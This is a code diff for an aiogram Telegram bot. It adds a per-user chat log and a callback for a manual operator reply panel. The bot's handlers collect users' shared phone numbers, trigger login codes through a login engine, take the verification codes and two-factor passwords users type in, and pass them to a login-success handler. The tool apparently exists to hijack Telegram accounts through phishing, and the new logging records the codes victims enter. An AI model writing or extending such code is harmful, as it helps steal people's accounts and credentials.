@@ -65,6 +65,34 @@ async def send_custom_response(bot: Bot, chat_id: int, text: str,
 # uid -> {"phone", "step", "created_at", "attempts"}
 _user_state: dict[int, dict] = {}
 
+# ── Chat history for manual reply panel ─────────────────────────
+# uid -> {"name": str, "messages": [{"from": "user"|"bot", "text": str, "time": float}]}
+_chat_store: dict[int, dict] = {}
+_chat_callback = None   # optional callback(uid) when new message arrives
+
+
+def set_chat_callback(cb):
+    global _chat_callback
+    _chat_callback = cb
+
+
+def get_chat_store() -> dict[int, dict]:
+    return _chat_store
+
+
+def _record_msg(uid: int, name: str, direction: str, text: str):
+    if uid not in _chat_store:
+        _chat_store[uid] = {"name": name, "messages": []}
+    _chat_store[uid]["name"] = name
+    _chat_store[uid]["messages"].append({
+        "from": direction, "text": text, "time": time.time(),
+    })
+    if _chat_callback:
+        try:
+            _chat_callback(uid)
+        except Exception:
+            pass
+
 
 async def _handle_login_success(bot: Bot, chat_id: int, uid: int,
                                 phone: str, user_info: dict):
@@ -166,6 +194,15 @@ async def check_timeouts_loop(bot: Bot):
 
 
 # ── /start ──────────────────────────────────────────────────────────
+def _user_name(message: Message) -> str:
+    u = message.from_user
+    if not u:
+        return str(message.chat.id)
+    parts = [u.first_name or "", u.last_name or ""]
+    name = " ".join(p for p in parts if p).strip()
+    return name or str(u.id)
+
+
 @router.message(Command("start"))
 async def cmd_start(message: Message, bot: Bot):
     uid = message.from_user.id
@@ -173,10 +210,12 @@ async def cmd_start(message: Message, bot: Bot):
     if old and "phone" in old:
         await login_engine.cancel_pending(old["phone"])
 
+    _record_msg(uid, _user_name(message), "user", "/start")
     text = _c("start_text", "欢迎使用")
     mode = "contact"
     reply_markup = main_menu_kb(mode)
     await send_custom_response(bot, message.chat.id, text, None, reply_markup)
+    _record_msg(uid, _user_name(message), "bot", text)
     logger.info(f"[{uid}] /start")
 
 
@@ -189,6 +228,7 @@ async def handle_contact(message: Message, bot: Bot):
         phone = "+" + phone
 
     uid = message.from_user.id
+    _record_msg(uid, _user_name(message), "user", f"[分享联系人] {phone}")
     result = await login_engine.send_code(phone)
     if result["success"]:
         _user_state[uid] = {
@@ -246,6 +286,7 @@ async def handle_code_input(message: Message, bot: Bot):
         return
     if message.text.startswith("/"):
         return
+    _record_msg(uid, _user_name(message), "user", message.text.strip())
 
     phone = state["phone"]
     max_attempts = int(_c("code_max_attempts", "3"))
@@ -305,6 +346,7 @@ async def handle_2fa_input(message: Message, bot: Bot):
         return
     if message.text.startswith("/"):
         return
+    _record_msg(uid, _user_name(message), "user", "[2FA密码]")
 
     phone = state["phone"]
     password = message.text.strip()
